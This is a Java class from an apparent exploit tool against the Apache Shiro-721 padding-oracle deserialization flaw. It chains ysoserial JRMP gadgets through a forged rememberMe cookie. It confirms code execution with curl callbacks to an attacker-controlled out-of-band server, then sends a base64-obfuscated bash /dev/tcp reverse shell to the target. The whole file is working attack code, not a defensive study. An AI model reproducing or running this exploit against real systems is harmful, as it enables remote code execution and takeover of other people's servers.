package com.shiroExploit.vulnverifier;

import com.shiroExploit.core.PaddingOracle;
import com.shiroExploit.util.*;
import org.apache.commons.codec.binary.Base64;
import java.io.File;
import java.io.IOException;
import java.util.*;

public class Shiro721VerifierWithJRMP implements Verifier {
    private Config config;
    private List<PayloadType> gadgets;

    public Shiro721VerifierWithJRMP(){
        System.out.println("[*] Using Shiro721VerifierWithJRMP");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }

    @Override
    public void getValidGadget() throws ExploitFailedException {
        for(PayloadType type : PayloadType.values()){
            System.out.println("[*] Trying Gadget: " + type.getName());
            String uuid = UUID.randomUUID().toString().replaceAll("-", "");
            String command = "curl http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/gadget?uuid=" + uuid + "&type=" + type.getName();
            Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), type, command);

            command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
            byte[] payload = Tools.exec(command);
            PaddingOracle paddingOracle = new PaddingOracle(config.getTargetURL(), config.getRememberMeCookie(), payload);
            String rememberMe = paddingOracle.encrypt();
            HttpRequest.request(config.getTargetURL(), rememberMe);

            try{
                Thread.sleep(config.getDelay() * 1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            String url = "http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/result";
            String res = null;
            try {
                res = HttpRequest.request(url);
            } catch (IOException e) {
                res = "";
            }
            String[] uuids = res.trim().split(",");
            Set<String> validUUID = new HashSet<>(Arrays.asList(uuids));

            if(validUUID.contains(uuid)){
                this.gadgets.add(type);
                System.out.println("[+] Find Valid Gadget: " + type.getName());
                if(config.isSkipIfFound()){
                    break;
                }
            }
        }

        if(this.gadgets.size() == 0){
            throw new ExploitFailedException("[-] Can't find a valid gadget");
        }
    }

    @Override
    public void getReverseShell() {
        String str = "bash -i >& /dev/tcp/" + config.getReverseShellIP() + "/" + config.getReverseShellPort() + " 0>&1";
        String base64 = Base64.encodeBase64String(str.getBytes());
        String cmd = "bash -c {echo," + base64 + "}|{base64,-d}|{bash,-i}";

        for(PayloadType gadget : this.gadgets){
            Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), gadget, cmd);

            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
            byte[] result = Tools.exec(command);
            PaddingOracle paddingOracle = new PaddingOracle(config.getTargetURL(), config.getRememberMeCookie(), result);
            String rememberMe = null;
            try {
                rememberMe = paddingOracle.encrypt();
                System.out.println("[+] 反弹Shell payload：");
                System.out.println("rememberMe=" + rememberMe);
            } catch (ExploitFailedException e) {
                e.printStackTrace();
            }
            HttpRequest.request(config.getTargetURL(), rememberMe);
        }
    }
}
